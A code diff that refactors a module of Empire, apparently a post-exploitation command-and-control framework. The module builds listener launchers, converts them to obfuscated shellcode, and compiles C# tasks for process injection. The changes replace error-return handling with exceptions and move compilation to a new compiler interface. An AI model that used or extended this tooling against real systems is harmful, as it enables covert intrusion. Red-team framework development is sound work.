@@ -7,8 +7,8 @@ import yaml
 
 from empire.server.common import helpers
 from empire.server.common.empire import MainMenu
+from empire.server.core.exceptions import ModuleExecutionException
 from empire.server.core.module_models import EmpireModule
-from empire.server.utils.module_util import handle_error_message
 
 
 class Module:
@@ -33,8 +33,7 @@ class Module:
         launcher_obfuscation = params["Obfuscate"]
 
         if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
-            # not a valid listener, return nothing for the script
-            return handle_error_message("[!] Invalid listener: " + listener_name)
+            raise ModuleExecutionException("Invalid listener: " + listener_name)
 
         launcher = main_menu.stagergenv2.generate_launcher(
             listener_name,
@@ -48,14 +47,14 @@ class Module:
         )
 
         if not launcher or launcher == "" or launcher.lower() == "failed":
-            return handle_error_message("[!] Invalid listener: " + listener_name)
+            raise ModuleExecutionException("Invalid launcher")
 
         if language.lower() == "powershell":
             shellcode, err = main_menu.stagergenv2.generate_powershell_shellcode(
                 launcher, arch=arch, dot_net_version=dot_net_version
             )
             if err:
-                return handle_error_message(err)
+                raise ModuleExecutionException(err)
 
         elif language.lower() == "csharp":
             if arch == "x86":
@@ -67,7 +66,7 @@ class Module:
             directory = f"{main_menu.installPath}/Empire-Compiler/EmpireCompiler/Data/Tasks/CSharp/Compiled/{dot_net_version}/{launcher}.exe"
 
             if not donut:
-                return handle_error_message(
+                raise ModuleExecutionException(
                     "module donut-shellcode not installed. It is only supported on x86."
                 )
 
@@ -85,30 +84,15 @@ class Module:
 
         base64_shellcode = helpers.encode_base64(shellcode).decode("UTF-8")
 
-        compiler = main_menu.pluginsv2.get_by_id("csharpserver")
-        if not compiler.enabled:
-            return None, "csharpserver plugin not running"
-
-        # Convert compiler.yaml to python dict
         compiler_dict: dict = yaml.safe_load(module.compiler_yaml)
-        # delete the 'Empire' key
         del compiler_dict[0]["Empire"]
-        # convert back to yaml string
         compiler_yaml: str = yaml.dump(compiler_dict, sort_keys=False)
 
-        file_name = compiler.do_send_message(
-            compiler_yaml, module.name, confuse=obfuscate
-        )
-        if file_name == "failed":
-            return None, "module compile failed"
-
-        script_file = (
-            main_menu.installPath
-            + "/Empire-Compiler/EmpireCompiler/Data/Tasks/CSharp/Compiled/"
-            + (params["DotNetVersion"]).lower()
-            + "/"
-            + file_name
-            + ".compiled"
+        script_file = main_menu.dotnet_compiler.compile_task(
+            compiler_yaml,
+            module.name,
+            dotnet=params["DotNetVersion"].lower(),
+            confuse=obfuscate,
         )
 
         if params["Technique"] == "Vanilla Process Injection":
